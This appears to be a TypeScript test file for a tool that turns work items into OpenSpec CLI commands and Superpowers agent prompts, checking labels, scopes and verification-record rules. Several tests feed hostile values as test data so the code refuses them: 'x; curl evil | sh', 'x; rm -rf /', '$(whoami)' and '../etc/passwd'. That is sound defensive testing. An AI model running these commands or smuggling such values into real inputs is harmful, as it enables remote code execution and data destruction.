import { assert, test } from 'orca/testing'
import {
  OPENSPEC_COMMANDS,
  VERIFICATION_RECORD_RULE,
  buildOpenspecCommands,
  type OpenspecCommand
} from './action-catalog'
import {
  item,
  itemWithChangeId,
  itemWithSuperpowers,
  openspecOnly,
  promptOf,
  superpowersOnly
} from './action-fixture'
import type { Action } from './model'
import {
  CHANGE_ID_PLACEHOLDER,
  actionsForItem,
  findAction,
  frameworkActions,
  needsChangeId,
  resolvePaletteAction
} from './actions'
import { RECORD_LINE_FORMAT, parseVerificationRecords } from './verification-records'
import { filledRecordLine } from './verification-rule-fixture'

test('runs OpenSpec commands in a terminal when the CLI is there', () => {
  const actions = actionsForItem(item, true)
  const validate = findAction(actions, 'openspec.validate')!
  assert.deepEqual(validate.run, { kind: 'terminal', command: 'openspec validate add-x --strict' })
  assert.equal(validate.mutates, false)
  assert.equal(findAction(actions, 'openspec.archive')?.mutates, true)
})

test('falls back to the agent form when the host has no CLI', () => {
  const actions = actionsForItem(item, false)
  for (const action of actions.filter((a) => a.framework === 'openspec')) {
    assert.equal(action.run.kind, 'agent', action.id)
    assert.match(promptOf(action), /openspec\/AGENTS\.md/)
  }
})

test('Superpowers actions are always dispatched to an agent', () => {
  const actions = actionsForItem(item, true)
  const plan = findAction(actions, 'superpowers.plan')!
  assert.equal(plan.run.kind, 'agent')
  assert.match(promptOf(plan), /superpowers:writing-plans/)
  assert.equal(plan.mutates, true)
})

test('omits OpenSpec actions for an item with no change', () => {
  const actions = actionsForItem(
    { topic: 'add-x', openspec: null, superpowers: item.superpowers },
    true
  )
  assert.equal(actions.filter((a) => a.framework === 'openspec').length, 0)
  assert.ok(actions.length > 0)
})

test('an item offers the commands of its change and the skills of its work', () => {
  assert.deepEqual(
    actionsForItem(item, true).map((action) => action.id),
    [
      'openspec.validate',
      'openspec.show',
      'openspec.complete',
      'openspec.implement',
      'openspec.archive',
      'superpowers.brainstorm',
      'superpowers.plan',
      'superpowers.execute',
      'superpowers.review',
      'superpowers.verify',
      'superpowers.finish'
    ]
  )
})

test('an item with only a change offers only the OpenSpec commands', () => {
  assert.deepEqual(
    actionsForItem(openspecOnly, true).map((action) => action.id),
    [
      'openspec.validate',
      'openspec.show',
      'openspec.complete',
      'openspec.implement',
      'openspec.archive'
    ]
  )
})

test('an item with only Superpowers work offers only the Superpowers skills', () => {
  assert.deepEqual(
    actionsForItem(superpowersOnly, true).map((action) => action.id),
    [
      'superpowers.brainstorm',
      'superpowers.plan',
      'superpowers.execute',
      'superpowers.review',
      'superpowers.verify',
      'superpowers.finish'
    ]
  )
})

test('the design button says whether it writes a design or designs it again', () => {
  // A work item with a design spec would have it designed again; one without gets one written.
  const withDesign = actionsForItem(item, true).find((action) => action.id === 'superpowers.brainstorm')
  assert.equal(withDesign?.label, '重新设计')
  const withoutDesign = actionsForItem(
    { ...item, topic: 'add-y', superpowers: { ...item.superpowers, designSpec: null } },
    true
  ).find((action) => action.id === 'superpowers.brainstorm')
  assert.equal(withoutDesign?.label, '写设计')
})

test('an item with neither side offers nothing', () => {
  assert.deepEqual(actionsForItem({ topic: 'add-x', openspec: null, superpowers: null }, true), [])
})

test('every action carries the label, the framework and the mutates flag of its row', () => {
  assert.deepEqual(
    actionsForItem(item, true).map((action) => [
      action.id,
      action.label,
      action.framework,
      action.mutates
    ]),
    [
      ['openspec.validate', '校验', 'openspec', false],
      ['openspec.show', '看增量', 'openspec', false],
      ['openspec.complete', '补齐变更', 'openspec', true],
      ['openspec.implement', '实现变更', 'openspec', true],
      ['openspec.archive', '归档', 'openspec', true],
      ['superpowers.brainstorm', '重新设计', 'superpowers', true],
      ['superpowers.plan', '写实施计划', 'superpowers', true],
      ['superpowers.execute', '执行计划', 'superpowers', true],
      ['superpowers.review', '代码评审', 'superpowers', false],
      ['superpowers.verify', '验证', 'superpowers', false],
      ['superpowers.finish', '收尾', 'superpowers', true]
    ]
  )
})

test('the OpenSpec steps the CLI has are the ones that run a command', () => {
  // Why: a card's OpenSpec button either runs the CLI or hands the work to the agent. The two
  // the CLI cannot do — filling the change in and implementing it — are the agent's, and they
  // say so: their run is a prompt, never a command line.
  for (const command of OPENSPEC_COMMANDS.filter((entry) => entry.scope === 'change')) {
    const action = findAction(actionsForItem(item, true), command.id)
    assert.ok(action, command.id)
    if (command.command === null) {
      assert.equal(action?.run.kind, 'agent', command.id)
    } else {
      assert.equal(action?.run.kind, 'terminal', command.id)
    }
  }
})

test('the OpenSpec commands are the ones the CLI actually has', () => {
  assert.deepEqual(
    actionsForItem(item, true)
      .filter((action) => action.framework === 'openspec')
      .map((action) => action.run),
    [
      { kind: 'terminal', command: 'openspec validate add-x --strict' },
      { kind: 'terminal', command: 'openspec show add-x --json --deltas-only' },
      {
        kind: 'agent',
        prompt:
          '按项目自己的 OpenSpec 规则（openspec/AGENTS.md，没有就 openspec/config.yaml）为变更 add-x 补齐 design、tasks 和增量 spec'
      },
      {
        kind: 'agent',
        prompt:
          '按项目自己的 OpenSpec 规则（openspec/AGENTS.md，没有就 openspec/config.yaml）实现变更 add-x，按它的 tasks.md 做'
      },
      { kind: 'terminal', command: 'openspec archive add-x --yes' }
    ]
  )
})

test("an item's commands name its own change, not the placeholder", () => {
  const actions = actionsForItem(item, true)
  assert.equal(
    actions.some((action) => JSON.stringify(action.run).includes('<change-id>')),
    false
  )
})

test('the agent fallback names the guide and the change it acts on', () => {
  const actions = actionsForItem(item, false).filter((action) => action.framework === 'openspec')
  assert.deepEqual(
    actions.map((action) => action.id),
    ['openspec.validate', 'openspec.show', 'openspec.complete', 'openspec.implement', 'openspec.archive']
  )
  for (const action of actions) {
    const prompt = promptOf(action)
    assert.match(prompt, /openspec\/AGENTS\.md/, action.id)
    assert.match(prompt, /add-x/, action.id)
  }
})

test('every Superpowers prompt names the skill it dispatches', () => {
  const skills: Record<string, string> = {
    'superpowers.brainstorm': 'superpowers:brainstorming',
    'superpowers.plan': 'superpowers:writing-plans',
    'superpowers.execute': 'superpowers:executing-plans',
    'superpowers.review': 'superpowers:requesting-code-review',
    'superpowers.verify': 'superpowers:verification-before-completion',
    'superpowers.finish': 'superpowers:finishing-a-development-branch'
  }
  for (const action of actionsForItem(item, true).filter((a) => a.framework === 'superpowers')) {
    assert.match(promptOf(action), new RegExp(skills[action.id]!), action.id)
    assert.equal(action.run.kind, 'agent', action.id)
  }
})

test('the Superpowers prompts name the artifacts they work on', () => {
  const actions = actionsForItem(item, true)
  assert.match(
    promptOf(findAction(actions, 'superpowers.plan')!),
    /docs\/superpowers\/specs\/x-design\.md/
  )
  assert.match(
    promptOf(findAction(actions, 'superpowers.execute')!),
    /docs\/superpowers\/plans\/x\.md/
  )
})

test('a Superpowers skill with no artifact yet asks for the generic one', () => {
  const actions = actionsForItem(
    {
      topic: 'add-x',
      openspec: null,
      superpowers: { ...item.superpowers, designSpec: null, plan: null }
    },
    true
  )
  assert.match(promptOf(findAction(actions, 'superpowers.plan')!), /设计 spec/)
  assert.match(promptOf(findAction(actions, 'superpowers.execute')!), /实施计划/)
})

test('an unknown action id is not found', () => {
  assert.equal(findAction(actionsForItem(item, true), 'openspec.nope'), null)
  assert.equal(findAction([], 'superpowers.plan'), null)
})

test('the Superpowers prompt names the topic of the work, not the change id', () => {
  const actions = actionsForItem(
    { ...item, topic: 'feature-two', openspec: { ...item.openspec, changeId: 'add-x' } },
    true
  )
  const brainstorm = promptOf(findAction(actions, 'superpowers.brainstorm')!)
  assert.match(brainstorm, /为 feature-two 产出设计 spec/)
  assert.equal(brainstorm.includes('add-x'), false)
})

test('an unsafe change id leaves the item with no OpenSpec action', () => {
  const actions = actionsForItem(itemWithChangeId('x; curl evil | sh'), true)
  assert.deepEqual(
    actions.filter((action) => action.framework === 'openspec').map((action) => action.id),
    []
  )
  assert.ok(actions.some((action) => action.framework === 'superpowers'))
})

test('an unsafe change id leaves the item with no OpenSpec action in the agent form either', () => {
  const actions = actionsForItem(itemWithChangeId('x; curl evil | sh'), false)
  assert.deepEqual(
    actions.filter((action) => action.framework === 'openspec').map((action) => action.id),
    []
  )
})

test('a change id that could be read as an option is refused', () => {
  const actions = actionsForItem(
    { topic: 'add-x', openspec: { ...item.openspec, changeId: '--help' }, superpowers: null },
    true
  )
  assert.deepEqual(actions, [])
})

test('no command line ever carries an unsafe change id', () => {
  for (const changeId of ['x; rm -rf /', 'a b', '$(whoami)', '`id`', '../escape', 'a|b']) {
    const actions = actionsForItem(
      { topic: 'add-x', openspec: { ...item.openspec, changeId }, superpowers: null },
      true
    )
    assert.deepEqual(actions, [], changeId)
  }
})

test('an unsafe topic falls back to the generic label', () => {
  const actions = actionsForItem({ ...item, topic: 'x; rm -rf /' }, true)
  const brainstorm = promptOf(findAction(actions, 'superpowers.brainstorm')!)
  assert.match(brainstorm, /为 这个工作项 产出设计 spec/)
  assert.equal(brainstorm.includes('rm -rf'), false)
})

test('an unsafe spec path falls back to the generic label', () => {
  const actions = actionsForItem(itemWithSuperpowers({ designSpec: 'docs/; rm -rf /' }), true)
  const plan = promptOf(findAction(actions, 'superpowers.plan')!)
  assert.match(plan, /基于 设计 spec 写实施计划/)
  assert.equal(plan.includes('rm -rf'), false)
})

test('a path segment that walks up the tree is refused', () => {
  const actions = actionsForItem(itemWithSuperpowers({ plan: '../etc/passwd' }), true)
  const execute = promptOf(findAction(actions, 'superpowers.execute')!)
  assert.match(execute, /执行 实施计划/)
  assert.equal(execute.includes('passwd'), false)
})

test('an empty artifact path falls back to the generic label', () => {
  const actions = actionsForItem(itemWithSuperpowers({ designSpec: '', plan: '' }), true)
  assert.match(
    promptOf(findAction(actions, 'superpowers.plan')!),
    /基于 设计 spec 写实施计划/
  )
  assert.match(promptOf(findAction(actions, 'superpowers.execute')!), /执行 实施计划/)
})

test('an absolute artifact path is allowed', () => {
  const actions = actionsForItem(itemWithSuperpowers({ designSpec: '/abs/specs/x-design.md' }), true)
  assert.match(
    promptOf(findAction(actions, 'superpowers.plan')!),
    /基于 \/abs\/specs\/x-design\.md 写实施计划/
  )
})

test('an archived change is not offered the archive command', () => {
  const actions = actionsForItem(
    { ...item, openspec: { ...item.openspec, stage: 'archived' } },
    true
  )
  assert.deepEqual(
    actions.map((action) => action.id),
    [
      'openspec.validate',
      'openspec.show',
      'openspec.complete',
      'openspec.implement',
      'superpowers.brainstorm',
      'superpowers.plan',
      'superpowers.execute',
      'superpowers.review',
      'superpowers.verify',
      'superpowers.finish'
    ]
  )
})

test('a change id that is the placeholder itself gets no OpenSpec action', () => {
  // A throw here would fail the test: one bad directory must not blank the whole board.
  const actions = actionsForItem(itemWithChangeId('<change-id>'), true)
  assert.deepEqual(
    actions.filter((action) => action.framework === 'openspec').map((action) => action.id),
    []
  )
  assert.ok(actions.some((action) => action.framework === 'superpowers'))
})

test('a change id that is the placeholder itself gets no OpenSpec action in the agent form', () => {
  const actions = actionsForItem(itemWithChangeId('<change-id>'), false)
  assert.deepEqual(
    actions.filter((action) => action.framework === 'openspec').map((action) => action.id),
    []
  )
})

test('the scope of an action is the scope of the command it came from', () => {
  const palette = frameworkActions(true)
  assert.deepEqual(
    palette.openspec.map((action) => [action.id, action.scope]),
    [
      ['openspec.list', 'project'],
      ['openspec.propose', 'project'],
      ['openspec.validate', 'change'],
      ['openspec.show', 'change'],
      ['openspec.complete', 'change'],
      ['openspec.implement', 'change'],
      ['openspec.archive', 'change']
    ]
  )
  // Superpowers has no command that acts on one change: a skill acts on the project.
  assert.deepEqual(
    palette.superpowers.map((action) => action.scope),
    ['project', 'project', 'project', 'project', 'project', 'project']
  )
  // The item's own actions carry it too.
  assert.deepEqual(
    actionsForItem(item, true).map((action) => action.scope),
    [
      'change',
      'change',
      'change',
      'change',
      'change',
      'project',
      'project',
      'project',
      'project',
      'project',
      'project'
    ]
  )
})

/**
 * The invariant, as a predicate: a change-scoped command names the change in every form it
 * has. The task an agent is asked to do always names it; a command line, when the CLI has one,
 * names it too — otherwise the change would have nowhere to go.
 */
function namesTheChange(command: OpenspecCommand): boolean {
  if (!command.task.includes(CHANGE_ID_PLACEHOLDER)) {
    return false
  }
  return command.command === null || command.command.includes(CHANGE_ID_PLACEHOLDER)
}

test('every change-scoped command names the change it acts on', () => {
  // The scope says the command acts on a change, so every form it has must name it.
  for (const command of OPENSPEC_COMMANDS.filter((entry) => entry.scope === 'change')) {
    assert.equal(namesTheChange(command), true, command.id)
  }
})

test('a change-scoped command needs no command line of its own', () => {
  // An agent-only command names the change in its task, and that is enough: there is no
  // command line for the change to go into.
  assert.equal(
    namesTheChange({
      id: 'openspec.example',
      label: '示例',
      mutates: false,
      scope: 'change',
      command: null,
      task: '严格校验变更 <change-id>'
    }),
    true
  )
  // One with nowhere to put the change is caught.
  assert.equal(
    namesTheChange({
      id: 'openspec.example',
      label: '示例',
      mutates: false,
      scope: 'change',
      command: 'openspec example',
      task: '严格校验变更 <change-id>'
    }),
    false
  )
  // One whose task names no change is caught: the agent would never be told which change.
  assert.equal(
    namesTheChange({
      id: 'openspec.example',
      label: '示例',
      mutates: false,
      scope: 'change',
      command: 'openspec validate <change-id> --strict',
      task: '严格校验变更'
    }),
    false
  )
})

test('a project-scoped action needs no change id, a change-scoped one does', () => {
  // A project-scoped action needs no change id.
  const project: Action = {
    id: 'openspec.list',
    label: '列出变更',
    framework: 'openspec',
    run: { kind: 'terminal', command: 'openspec list' },
    mutates: false,
    scope: 'project'
  }
  assert.equal(needsChangeId(project), false)
  assert.deepEqual(resolvePaletteAction(project, undefined), { ok: true, action: project })
  // A change-scoped action needs one even when its text does not name it.
  const change: Action = {
    id: 'openspec.validate',
    label: '校验',
    framework: 'openspec',
    run: { kind: 'terminal', command: 'openspec validate --strict' },
    mutates: false,
    scope: 'change'
  }
  assert.equal(needsChangeId(change), true)
  assert.deepEqual(resolvePaletteAction(change, undefined), {
    ok: false,
    reason: 'needs-change-id'
  })
  // A change-scoped action may carry the placeholder: it is filled in when the change is named.
  const placeholder: Action = {
    ...change,
    run: { kind: 'terminal', command: 'openspec validate <change-id> --strict' }
  }
  const resolved = resolvePaletteAction(placeholder, 'add-x')
  assert.equal(resolved.ok, true)
  assert.deepEqual(resolved.ok && resolved.action.run, {
    kind: 'terminal',
    command: 'openspec validate add-x --strict'
  })
})

test('a project-scoped action that carries the placeholder is refused', () => {
  // There is no change to put in it: the literal would reach the terminal as it is.
  const project: Action = {
    id: 'openspec.list',
    label: '列出变更',
    framework: 'openspec',
    run: { kind: 'terminal', command: 'openspec list <change-id>' },
    mutates: false,
    scope: 'project'
  }
  assert.deepEqual(resolvePaletteAction(project, undefined), {
    ok: false,
    reason: 'placeholder-in-project-action'
  })
  const prompt: Action = {
    id: 'openspec.propose',
    label: '新建提案',
    framework: 'openspec',
    run: { kind: 'agent', prompt: '归档变更 <change-id>' },
    mutates: true,
    scope: 'project'
  }
  assert.deepEqual(resolvePaletteAction(prompt, 'add-x'), {
    ok: false,
    reason: 'placeholder-in-project-action'
  })
})

test('no project-scoped command of the catalog names a change', () => {
  // The rule, not the catalog's inventory: any project-scoped command that carries the
  // placeholder fails here, whether or not the catalog's own guard still throws.
  for (const command of OPENSPEC_COMMANDS) {
    if (command.scope !== 'project') {
      continue
    }
    assert.equal(command.task.includes(CHANGE_ID_PLACEHOLDER), false, command.id)
    assert.equal(command.command?.includes(CHANGE_ID_PLACEHOLDER) ?? false, false, command.id)
  }
})

test('the catalog refuses a project-scoped command that names a change', () => {
  // The rule runs where the catalog is built: a command it refuses never becomes a row, so it
  // never reaches a terminal.
  assert.throws(
    () =>
      buildOpenspecCommands([
        {
          id: 'openspec.example',
          label: '示例',
          mutates: false,
          scope: 'project',
          command: 'openspec example <change-id>',
          task: '示例'
        }
      ]),
    /项目级命令不能带变更占位符/
  )
  assert.throws(
    () =>
      buildOpenspecCommands([
        {
          id: 'openspec.example',
          label: '示例',
          mutates: false,
          scope: 'project',
          command: null,
          task: '示例 <change-id>'
        }
      ]),
    /项目级命令不能带变更占位符/
  )
})

test('the catalog is made of the commands the rule accepted', () => {
  // The wiring: the catalog is built through the rule, so every row of it is a row the rule
  // accepted — and froze, so nothing can put a change into a project-scoped command afterwards.
  assert.equal(Object.isFrozen(OPENSPEC_COMMANDS), true)
  for (const command of OPENSPEC_COMMANDS) {
    assert.equal(Object.isFrozen(command), true, command.id)
  }
})

test('a remote project is acted on by an agent, not by a command here', () => {
  // The project lives on another machine: the desktop cannot put its command in a terminal of
  // its own, so the action is a prompt — and the agent that carries it runs there, in the
  // project's own workspace.
  const actions = actionsForItem(item, true, { host: 'ssh:yolo', path: 'C:/work/remote' })
  for (const action of actions.filter((entry) => entry.framework === 'openspec')) {
    assert.equal(action.run.kind, 'agent', action.id)
  }
  // The prompt names the work, not the machine: the agent is already there.
  const prompt = promptOf(findAction(actions, 'openspec.validate')!)
  assert.match(prompt, /add-x/)
  assert.equal(prompt.includes('ssh:yolo'), false)
  assert.equal(prompt.includes('C:/work/remote'), false)
})

test('a remote project with the CLI runs the command there', () => {
  // The CLI is on the machine that holds the project, and the agent runs on that machine too:
  // the prompt carries the command, so the work happens where the files are.
  const actions = actionsForItem(item, true, { host: 'ssh:yolo', path: 'C:/work/remote' })
  const validate = findAction(actions, 'openspec.validate')!
  assert.equal(validate.run.kind, 'agent')
  assert.match(promptOf(validate), /openspec validate add-x --strict/)
  const archive = findAction(actions, 'openspec.archive')!
  assert.match(promptOf(archive), /openspec archive add-x --yes/)
})

test('a remote project without the CLI gets the guide, not a command', () => {
  // No CLI on that machine: there is no command to run, so the agent is asked by the rules.
  const actions = actionsForItem(item, false, { host: 'ssh:yolo', path: 'C:/work/remote' })
  const validate = findAction(actions, 'openspec.validate')!
  assert.equal(validate.run.kind, 'agent')
  assert.match(promptOf(validate), /openspec\/AGENTS\.md/)
  assert.equal(promptOf(validate).includes('openspec validate'), false)
})

test('a step the CLI has no command for is the agent work either way', () => {
  // Implementing a change is the agent s work: there is no command line for it.
  const actions = actionsForItem(item, true, { host: 'ssh:yolo', path: 'C:/work/remote' })
  const implement = findAction(actions, 'openspec.implement')!
  assert.equal(implement.run.kind, 'agent')
  assert.match(promptOf(implement), /openspec\/AGENTS\.md/)
})

test('验证这一按钮要求 agent 写下这一轮，并点名计划文件', () => {
  const prompt = promptOf(findAction(actionsForItem(item, true), 'superpowers.verify')!)
  assert.match(prompt, /## 验证记录/)
  assert.match(prompt, /docs\/superpowers\/plans\/x\.md/)
  // 复选框那一句是必需的：agent 写复选框是很自然的事，不说它就会那么写。
  assert.match(prompt, /不要写复选框/)
  // 规则里的那一行和解析器读回来的一行必须逐字相同：分隔符、结论词、日期格式都是死的。
  assert.ok(
    prompt.includes(`\`${RECORD_LINE_FORMAT}\``),
    'the rule must spell the record line the way the parser reads it'
  )
})

test('没有计划的工作项不要求写记录', () => {
  // 没有地方放记录，要求它写只会让 agent 去找一份不存在的计划。
  const prompt = promptOf(
    findAction(
      actionsForItem({ ...item, superpowers: { ...item.superpowers, plan: null } }, true),
      'superpowers.verify'
    )!
  )
  assert.equal(prompt.includes('## 验证记录'), false)
})

test('计划路径不能命名时也不要求写记录', () => {
  // 文件名是目录里读出来的，「一份副本」就是真的名字。规则点名通用字样的话，agent 会去找一份
  // 叫「实施计划」的文件——它不存在，agent 说不定还会建一个。
  const prompt = promptOf(
    findAction(
      actionsForItem(itemWithSuperpowers({ plan: 'docs/superpowers/plans/x (copy).md' }), true),
      'superpowers.verify'
    )!
  )
  assert.equal(prompt.includes('## 验证记录'), false)
})

test('空计划路径也不要求写记录', () => {
  // 空路径不是一条计划：它不是 null，规则却会指向通用字样。
  const prompt = promptOf(
    findAction(actionsForItem(itemWithSuperpowers({ plan: '' }), true), 'superpowers.verify')!
  )
  assert.equal(prompt.includes('## 验证记录'), false)
})

test('调色板里的验证动作不要求写记录', () => {
  // 调色板不知道具体是哪份计划。
  const palette = frameworkActions(false)
  const verify = palette.superpowers.find((action) => action.id === 'superpowers.verify')!
  assert.equal(promptOf(verify).includes('## 验证记录'), false)
})

test('规则里的格式行，解析器读得出来', () => {
  // 规则与解析器必须同时认同一行：规则是 agent 的唯一通道，漂移了就是静默丢轮次。
  const format = VERIFICATION_RECORD_RULE.match(/`(- <[^`]+>)`/)?.[1]
  assert.ok(format, 'the rule must spell the record line inside backticks')
  const facts = parseVerificationRecords(
    ['## 验证记录', filledRecordLine(format)].join('\n')
  )
  assert.deepEqual(facts, { rounds: 1, passed: 1, lastPassed: true })
})

test('验证规则说清结论只有两个词', () => {
  // 解析器只认整词。规则把两个词用斜杠并列，agent 照抄就写出一行不算轮的记录——
  // 轮次静默丢掉，卡片一直停在「校验」。
  assert.match(VERIFICATION_RECORD_RULE, /通过/)
  assert.match(VERIFICATION_RECORD_RULE, /未通过/)
  assert.equal(VERIFICATION_RECORD_RULE.includes('通过/未通过'), false)
  assert.match(VERIFICATION_RECORD_RULE, /一个整词/)
})
